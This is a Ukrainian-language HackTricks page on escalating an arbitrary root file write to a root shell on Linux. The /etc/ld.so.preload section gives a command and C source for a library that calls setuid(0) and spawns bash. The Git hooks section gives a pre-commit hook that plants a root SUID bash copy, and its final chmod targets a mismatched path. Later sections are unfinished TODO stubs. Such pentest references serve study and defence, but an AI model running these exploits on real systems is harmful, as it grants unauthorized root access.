# Довільне записування файлів в Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Цей файл працює як змінна середовища **`LD_PRELOAD`**, але також працює в **SUID бінарниках**.\
Якщо ви можете його створити або змінити, ви можете просто додати **шлях до бібліотеки, яка буде завантажена** з кожним виконуваним бінарником.

Наприклад: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) - це **скрипти**, які **виконуються** при різних **подіях** у репозиторії git, таких як створення коміту, злиття... Тож, якщо **привілейований скрипт або користувач** часто виконує ці дії і є можливість **записувати в папку `.git`**, це можна використати для **privesc**.

Наприклад, можливо **згенерувати скрипт** у репозиторії git в **`.git/hooks`**, щоб він завжди виконувався, коли створюється новий коміт:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & Time files

TODO

### Service & Socket files

TODO

### binfmt_misc

Файл, розташований у `/proc/sys/fs/binfmt_misc`, вказує, який бінарний файл має виконувати який тип файлів. TODO: перевірте вимоги для зловживання цим, щоб виконати rev shell, коли відкрито загальний тип файлу.

{{#include ../../banners/hacktricks-training.md}}
